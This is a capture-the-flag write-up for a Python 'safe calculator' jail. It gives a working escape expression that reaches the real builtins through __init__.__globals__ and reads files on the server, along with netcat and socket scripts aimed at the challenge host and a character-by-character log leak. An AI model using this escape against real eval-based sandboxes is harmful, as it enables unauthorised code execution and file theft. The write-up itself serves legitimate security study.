# Bakom Lås Och Orm — English

**Category:** Pwn / Python jail · **Service:** `nc challs.crate.nu 31729`

A Python "safe calculator" reads a single expression (max 80 characters), parses it with
`ast.parse`, rejects a handful of AST node types, then `eval`s it with a restricted builtins
dict. The jail is escapable because attribute access, calls and subscripts are allowed, and a
challenge object is exposed in the eval globals — giving a path to the *real*, unrestricted
`builtins` module.

## 1. Inspect the sandbox

The service:

- parses the expression with `ast.parse`;
- **blocks** these AST node classes: `Import`, `Assign`, `FunctionDef`, `ClassDef`, `While`,
  `For`, `With`, `Try`, `Lambda`;
- `eval`s with a reduced builtins set `SAFE_BUILTINS = {abs, len, sum, min, max, sorted,
  getattr, range}`;
- does **not** block `Attribute`, `Call`, or `Subscript` nodes;
- exposes a global object `prison` — an instance of the challenge's own `Prison` class.

All challenge classes (`Prison`, `Calculator`, `History`, `Debugger`) are defined in the
script's own `__main__` module.

## 2. The escape gadget

Any function defined in `__main__` carries the module's **real** global namespace in its
`__globals__`, and Python always stores the genuine `builtins` module under the
`'__builtins__'` key of a module's globals. The restricted `SAFE_BUILTINS` dict is used only
for the `eval()` call itself — it does not touch the module globals. So:

```text
prison.__init__.__globals__['__builtins__']
```

returns the **real, unrestricted `builtins` module**, exposing `open`, `__import__`, etc.,
completely bypassing `SAFE_BUILTINS`. All of this fits the 80-character limit and uses only
allowed node types (attribute access + subscript + call).

## 3. Enumerate the filesystem (optional confirmation)

```text
prison.__init__.__globals__['__builtins__'].__import__('os').listdir('.')
```

Returns:

```text
['calc_history.txt', 'jail.py', 'logs.txt', 'old_logs.txt']
```

(Working directory `/home/ctf`.) This confirms real server-side filesystem access.

## 4. Read the flag (exact jail-escape expression)

The flag lives in `old_logs.txt`. The exact escape expression used (66 characters) is:

```text
prison.__init__.__globals__['__builtins__'].open('old_logs.txt').read()
```

Send it as a single line. One-liner reproduction:

```bash
printf "prison.__init__.__globals__['__builtins__'].open('old_logs.txt').read()\n" \
  | nc challs.crate.nu 31729
```

Or in Python:

```python
import socket
HOST, PORT = "challs.crate.nu", 31729
PAYLOAD = "prison.__init__.__globals__['__builtins__'].open('old_logs.txt').read()"
with socket.create_connection((HOST, PORT), timeout=10) as s:
    s.recv(4096)                       # banner/prompt
    s.sendall((PAYLOAD + "\n").encode())
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
# output is printed after the "> " prompt
print(data.decode("utf-8", "replace").split("> ")[-1].strip())
```

The flag `cratectf{...}` is printed directly after the `>` prompt (redacted here).

## Alternative route: the exposed `Debugger`

The challenge also exposes a `Debugger` reachable as `prison.calc.debugger`. Its
`show_logs(index)` method returns `f.readline()[index]` — a single character of the first log
line at position `index`. Starting at `index = 0` and incrementing until `IndexError`
reconstructs the first line of the same log file one character at a time, e.g.:

```text
prison.calc.debugger.show_logs(0)   # first character
prison.calc.debugger.show_logs(1)   # second character, ...
```

Both routes read the same server-side file; the `__builtins__` route reads it in one shot.

## Verification

Platform-confirmed solved, and independently reproduced against the live service — the
`old_logs.txt` read returns the real `cratectf{...}` flag, redacted for publication.
